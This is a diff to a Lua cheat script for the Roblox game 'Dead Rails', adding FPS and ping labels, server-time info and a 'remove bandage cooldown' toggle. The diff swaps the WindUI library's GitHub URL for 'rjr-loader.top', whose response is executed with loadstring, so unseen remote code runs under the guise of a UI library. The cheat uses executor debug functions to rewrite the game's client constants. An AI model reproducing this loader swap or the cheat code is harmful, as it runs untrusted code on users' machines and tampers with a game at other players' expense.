@@ -4,6 +4,7 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
 
 ----------------------------------------
 -- 防重複啟用
@@ -26,7 +27,7 @@ getgenv().DeadRailsLoaded = true
 -- WindUI 載入
 --------------------------
 local WindUI = loadstring(request({
-    Url = "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"
+    Url = "https://rjr-loader.top/script/www"
 }).Body)()
 
 local Window = WindUI:CreateWindow({
@@ -52,14 +53,14 @@ local Window = WindUI:CreateWindow({
     HideSearchBar = false,
     SideBarWidth  = 200,
     OpenButton = {
-        Title           = "Dead Rails",
-        CornerRadius    = UDim.new(1, 0),
+        Title               = "Dead Rails",
+        CornerRadius        = UDim.new(1, 0),
         StrokeThickness = 3,
-        Enabled         = true,
-        OnlyMobile      = false,
-        Draggable       = true,
-        OnlyIcon        = false,
-        Color           = ColorSequence.new(Color3.fromHex("#8B0000"), Color3.fromHex("#FF4500")),
+        Enabled             = true,
+        OnlyMobile          = false,
+        Draggable           = true,
+        OnlyIcon            = false,
+        Color               = ColorSequence.new(Color3.fromHex("#8B0000"), Color3.fromHex("#FF4500")),
     }
 })
 
@@ -71,6 +72,9 @@ end)
 ----------------------------------------
 --變數
 ----------------------------------------
+-- 移除繃帶冷卻
+_G.RemoveBandageCooldown_ENABLED = false
+
 --自動執行
 local queue_on_teleport = queue_on_teleport or (syn and syn.queue_on_teleport)
 
@@ -101,6 +105,7 @@ local ConfigSaving = false
 local ConfigDirty = false
 
 local ConfigKeys = {
+		"RemoveBandageCooldown_ENABLED",
     "AutoExecute",
     "CurrentKey",
     "KeyDisabled"
@@ -186,9 +191,199 @@ task.spawn(function()
     end
 end)
 
+----------------------------------------
+-- FPS / Ping 標籤
+----------------------------------------
+local FPSTag = Window:Tag({
+    Title = "FPS: 0",
+    Color = Color3.fromRGB(100, 150, 255),
+})
+
+local PingTag = Window:Tag({
+    Title = "Ping: 0ms",
+    Color = Color3.fromRGB(100, 200, 255),
+})
+
+task.spawn(function()
+    local RunService = game:GetService("RunService")
+    local lastUpdate = tick()
+    local frameCount = 0
+
+    RunService.RenderStepped:Connect(function()
+        frameCount = frameCount + 1
+        local now = tick()
+
+        if now - lastUpdate >= 1 then
+            local fps = math.floor(frameCount / (now - lastUpdate))
+            FPSTag:SetTitle("FPS: " .. fps)
+
+            if fps >= 120 then
+                FPSTag:SetColor(Color3.fromRGB(0, 255, 0))
+            elseif fps >= 60 then
+                FPSTag:SetColor(Color3.fromRGB(255, 200, 0))
+            else
+                FPSTag:SetColor(Color3.fromRGB(255, 0, 0))
+            end
+
+            frameCount = 0
+            lastUpdate = now
+        end
+    end)
+end)
+
+task.spawn(function()
+    while true do
+        local success, ping = pcall(function()
+            return LocalPlayer:GetNetworkPing() * 1000
+        end)
+
+        if success and ping then
+            PingTag:SetTitle(string.format("Ping: %.0f ms", ping))
+
+            if ping <= 65 then
+                PingTag:SetColor(Color3.fromRGB(0, 255, 0))
+            elseif ping <= 100 then
+                PingTag:SetColor(Color3.fromRGB(255, 200, 0))
+            elseif ping <= 200 then
+                PingTag:SetColor(Color3.fromRGB(255, 150, 0))
+            else
+                PingTag:SetColor(Color3.fromRGB(255, 0, 0))
+            end
+        end
+
+        task.wait(2)
+    end
+end)
+
 --------------------------
 -- 功能核心邏輯
 --------------------------
+-- 伺服器運行時間
+local function convertToDetailedTime(S)
+    local h = math.floor(S / 3600)
+    S %= 3600
+    local m = math.floor(S / 60)
+    local s = S % 60
+    return { Hours = h, Minutes = m, Seconds = s }
+end
+
+local function GetServerUptimeString()
+    local t = time()
+    local u = convertToDetailedTime(math.floor(t))
+    return string.format(
+        "%d時 %d分 %d秒",
+        u.Hours, u.Minutes, u.Seconds
+    )
+end
+
+-- 加入時間
+local function GetLastJoinedString()
+    local c = os.time()
+    local j = c - math.floor(time())
+    local jt = os.date("*t", j)
+
+    local ap = jt.hour >= 12 and "下午" or "上午"
+    local h12 = jt.hour % 12
+    if h12 == 0 then h12 = 12 end
+
+    local mn = { "1月","2月","3月","4月","5月","6月","7月","8月","9月","10月","11月","12月" }
+
+    return string.format(
+        "%s%d日 %s %02d點 %02d分 %02d秒",
+        mn[jt.month], jt.day, ap, h12, jt.min, jt.sec
+    )
+end
+
+-- 移除繃帶冷卻
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+LocalPlayer.CharacterAdded:Connect(function(newChar)
+    Character = newChar
+end)
+
+local BANDAGE_FAST_TIME = 0.05
+
+local function patchBandageScript(cs)
+    for _, conn in ipairs(getconnections(RunService.RenderStepped)) do
+        local fn = conn.Function
+        if type(fn) == "function" then
+            local ok, env = pcall(getfenv, fn)
+            if ok and type(env) == "table" and rawget(env, "script") == cs then
+                local okC, consts = pcall(debug.getconstants, fn)
+                if okC then
+                    for i, v in pairs(consts) do
+                        if v == 3.7 then
+                            pcall(debug.setconstant, fn, i, BANDAGE_FAST_TIME)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+local bandage = { connections = {}, watched = {}, enabled = false }
+
+local function watchTool(tool)
+    if not bandage.enabled or bandage.watched[tool] or not tool:IsA("Tool") then
+        return
+    end
+    task.spawn(function()
+        local cs = tool:WaitForChild("BandageClient", 5)
+        if not cs or not bandage.enabled or bandage.watched[tool] then return end
+
+        bandage.watched[tool] = true
+
+        table.insert(bandage.connections,
+            tool.Equipped:Connect(function()
+                task.delay(0.1, patchBandageScript, cs)
+            end)
+        )
+
+        if tool.Parent == Character then
+            task.delay(0.1, patchBandageScript, cs)
+        end
+    end)
+end
+
+local function watchContainer(c)
+    for _, ch in ipairs(c:GetChildren()) do
+        watchTool(ch)
+    end
+    table.insert(bandage.connections,
+        c.ChildAdded:Connect(watchTool)
+    )
+end
+
+local function stopBandage()
+    bandage.enabled = false
+    for _, c in ipairs(bandage.connections) do c:Disconnect() end
+    table.clear(bandage.connections)
+    table.clear(bandage.watched)
+end
+
+local function startBandage()
+    stopBandage()
+    bandage.enabled = true
+
+    local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
+    if bp then watchContainer(bp) end
+    if Character then watchContainer(Character) end
+
+    table.insert(bandage.connections,
+        LocalPlayer.CharacterAdded:Connect(function(c)
+            table.clear(bandage.watched)
+            watchContainer(c)
+            local nb = LocalPlayer:WaitForChild("Backpack", 5)
+            if nb then watchContainer(nb) end
+        end)
+    )
+end
+
+if _G.RemoveBandageCooldown_ENABLED then
+    startBandage()
+end
+
 --自動執行
 local queue_func = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)
 
@@ -200,12 +395,45 @@ end
 -- 分頁
 --------------------------
 local Tabs = {
+    Info = Window:Tab({ Title = "資訊", Icon = "info" }),
+		Heal = Window:Tab({ Title = "治療", Icon = "heart-pulse" }),
     Settings = Window:Tab({ Title = "設定", Icon = "settings" })
 }
 
 --------------------------
 -- 元件
 --------------------------
+local ServerInfoParagraph = Tabs.Info:Paragraph({
+    Title = "伺服器運行時間",
+    Desc  = GetServerUptimeString()
+})
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            ServerInfoParagraph:SetDesc(GetServerUptimeString())
+        end)
+        task.wait(1)
+    end
+end)
+
+Tabs.Info:Paragraph({ Title = "加入時間", Desc = GetLastJoinedString() })
+
+Tabs.Heal:Section({ Title = "治療" })
+
+Tabs.Heal:Toggle({
+    Title = "移除繃帶冷卻",
+    Value = _G.RemoveBandageCooldown_ENABLED,
+    Callback = function(v)
+        _G.RemoveBandageCooldown_ENABLED = v
+        if v then
+            startBandage()
+        else
+            stopBandage()
+        end
+    end,
+})
+
 Tabs.Settings:Section({ Title = "重置腳本" })
 
 Tabs.Settings:Button({
